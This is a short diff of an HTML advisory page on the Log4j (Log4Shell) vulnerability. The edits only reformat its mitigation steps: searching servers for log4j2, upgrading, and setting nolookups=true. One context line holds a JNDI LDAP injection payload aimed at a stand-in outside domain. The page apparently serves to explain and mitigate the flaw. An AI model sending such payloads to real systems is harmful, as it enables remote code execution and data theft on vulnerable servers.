@@ -322,16 +322,16 @@ ${jndi:ldap://${main:bar}.domain.com/j}
 </code><br>
     
 <h2>6.<u>Mitigation</h2>
-1. SPOT VULNERABLE APPLICATIONS<br>
+    1. <b>SPOT VULNERABLE APPLICATIONS</b><br>
 
 Ask admin/system team to run a search/grep command on all servers to spot any file with the name “log4j2”, Then check if it is a vulnerable version or not”<br>
 
-2. PERMANENT MITIGATION<br>
+    2. <b>PERMANENT MITIGATION</b><br>
 
 Version 2.15.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j page below, You
 can download it and update your system<br>
     
-3. TEMPORARY MITIGATION<br>
+    3. <b>TEMPORARY MITIGATION</b><br>
 
     “Add <code>“log4j.format.msg.nolookups=true”</code> to the global configuration of your server/web applications”<br>
 
